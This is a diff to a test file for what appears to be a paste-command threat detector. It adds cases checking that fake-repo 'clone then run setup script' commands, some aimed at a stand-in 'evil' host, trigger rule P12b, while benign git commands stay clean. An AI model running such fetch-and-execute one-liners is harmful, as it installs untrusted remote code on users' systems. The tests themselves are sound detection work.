@@ -504,6 +504,23 @@ jcheck "ncfetch: sync+exec stays clean" 'd["score"] == 0' paste 'sync && sh x'
 jcheck "ncfetch: zinc+exec stays clean" 'd["score"] == 0' paste 'zinc a; sh x'
 jcheck "ncfetch: ncdu own class not P12b" 'd["score"] == 45 and "P12b" not in str(d["reasons"])' paste 'ncdu /tmp; sh x'
 
+# VCS/alt-downloader fetch coverage (cycle-484): `git clone url && sh
+# setup.sh` — the fake-repo-install ClickFix shape — scored 0 because
+# git is deliberately needle-free (most-common benign command). Fetch
+# *verbs* join PASTE_FETCH_TOOLS: git clone/pull, svn co/checkout,
+# hg clone, aria2c/axel/lftp/rcp/wput/yafc — all zero container-word
+# collisions (compound or rare names).
+jcheck "vcsfetch: git clone+exec fires P12b" 'd["score"] == 45 and "P12b" in str(d["reasons"])' paste 'git clone http://evil/r && sh r/setup.sh'
+jcheck "vcsfetch: git clone; exec fires P12b" 'd["score"] == 45 and "P12b" in str(d["reasons"])' paste 'git clone http://evil/r; sh r/install.sh'
+jcheck "vcsfetch: git pull+exec fires P12b" 'd["score"] == 45' paste 'git pull && ./build.sh'
+jcheck "vcsfetch: svn co+exec fires P12b" 'd["score"] == 45' paste 'svn co http://x && sh x/s'
+jcheck "vcsfetch: hg clone+exec elevates" 'd["score"] >= 45' paste 'hg clone http://x && sh x/s'
+jcheck "vcsfetch: aria2c+exec elevates" 'd["score"] >= 45' paste 'aria2c http://x -o s && sh s'
+jcheck "vcsfetch: bare git clone stays clean" 'd["score"] == 0' paste 'git clone x'
+jcheck "vcsfetch: git clone+cd stays clean" 'd["score"] == 0' paste 'git clone x && cd x'
+jcheck "vcsfetch: git status+exec stays clean" 'd["score"] == 0' paste 'git status && sh x'
+jcheck "vcsfetch: git pull+make stays clean" 'd["score"] == 0' paste 'git pull && make'
+
 # P8 (also:) overflow guard: 5 hits with 105-141-char labels must not
 # smash extra[192] — cycle-439 fixed a would-be-length advance that
 # underflowed the snprintf size (ASan stack-buffer-overflow).
